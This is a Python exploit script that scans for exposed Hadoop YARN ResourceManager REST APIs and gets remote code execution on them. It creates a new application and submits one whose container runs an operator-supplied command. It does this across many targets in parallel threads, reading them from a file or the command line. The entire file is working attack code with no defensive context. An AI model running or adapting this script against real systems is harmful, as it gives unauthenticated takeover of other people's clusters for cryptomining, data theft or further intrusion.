import sys
import json
import time
import random
import urllib3
import datetime
import requests
import threading
from optparse import OptionParser
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def write_log(content) -> None:
    timestamp: str = str(datetime.datetime.fromtimestamp(time.time()))
    with open("./running.log", 'a') as file_writer:
        content: str = str(content).replace("\n", "")
        message: str = "[%s] %s\n" % (timestamp, content)
        try:
            file_writer.write(message)
        except Exception as error:
            err_message: str = "[-][%s]Write log error!" % timestamp
            file_writer.write(err_message)


class HadoopYarnRCEVulnerabilityExploiter(threading.Thread):
    def __init__(self, target: str, command: str):
        threading.Thread.__init__(self)
        self.target: str = target if target.endswith("/") else target + "/"
        self.command = command
        write_log("[-] Start To Exploit Hadoop Yarn RCE Vulnerability, Target is (%s)!" % str(self.target))

    def run(self):
        request1_url: str = self.target + "ws/v1/cluster/apps/new-application"
        app_id: str = ""
        try:
            response1: requests.Response = requests.post(request1_url, verify=False, timeout=3)
            app_id = json.loads(response1.text)["application-id"]
        except Exception as error:
            write_log("[-] Error : %s" % str(error))
            return
        if app_id == "":
            write_log("[-] Get Application ID error!")
            return
        app_name: str = "hello-" + str(random.randint(100, 500))
        request2_url: str = self.target + "ws/v1/cluster/apps"
        data = {
            "application-id": app_id,
            "application-name": app_name,
            'am-container-spec': {
                'commands': {
                    'command': self.command,
                },
            },
            'application-type': 'YARN',
        }
        try:
            response2: requests.Response = requests.post(request2_url, json=data, verify=False, timeout=3)
            print("[+] Target %s exploit Done!" % str(self.target) )
        except Exception as error:
            write_log("[-] Error : %s" % str(error))
            return


class HadoopYarnRCEScannerCreater(object):
    def __init__(self, command: str, target: str, target_file: str = None, thread_count: int = 10):
        self.target_list: list = []
        self.command = command
        self.thread_count: int = thread_count
        self.thread_size: int = 0
        self.thread_list: list = []
        # start to handle target file
        if target_file is not None:
            try:
                with open(target_file, 'r') as file_reader:
                    for line in file_reader:
                        line = line.split("\n")[0].split("\r")[0]
                        self.target_list.append(line)
            except Exception as error:
                print("[-] Get targets information error!")
                write_log(error)
        # start to handle target
        if target is not None:
            self.target_list.append(target)
        print("[+] Get targets finished!")

    def run(self) -> None:
        """Running verify functions with multi-thread!"""
        if len(self.target_list) <= 0:
            print("[-] No targets to scan!")
            return
        print("[+] Start scanning! Totally %s targets!" % str(len(self.target_list)))
        for target in self.target_list:
            if self.thread_size < self.thread_count:
                thread = HadoopYarnRCEVulnerabilityExploiter(target, self.command)
                self.thread_list.append(thread)
                self.thread_size += 1
            if self.thread_size == self.thread_count or self.thread_size == len(self.target_list) % self.thread_count:
                for thread in self.thread_list:
                    thread.start()
                for thread in self.thread_list:
                    thread.join()
                self.thread_list = []
                self.thread_size = 0
            else:
                self.thread_list = []
                self.thread_size = 0
                continue

if __name__ == "__main__":
    parser = OptionParser("")
    parser.add_option("-t", dest="target", help="target to scan")
    parser.add_option("-f", dest="targetfile", help="target file to scan")
    parser.add_option("-s", dest="threadsize", help="size of threadpool?[10,15,20,25,30,35,40,45,50]")
    parser.add_option("-c", dest="command", help="command to execute")
    (options, args) = parser.parse_args()
    options.threadsize = int(options.threadsize)
    if options.threadsize not in [10, 15, 20, 25, 30, 35, 40, 45, 50]:
        options.threadsize = 10
    print("[+] Configure maximum thread count to %s!" % str(options.threadsize))
    if options.command in ["", " ", None]:
        print("[-] Please input a command to execute!")
        sys.exit(0)
    scanner = HadoopYarnRCEScannerCreater(options.command, options.target, options.targetfile, options.threadsize)
    scanner.run()
    print("[+] Scanning finished! ByeBye!")
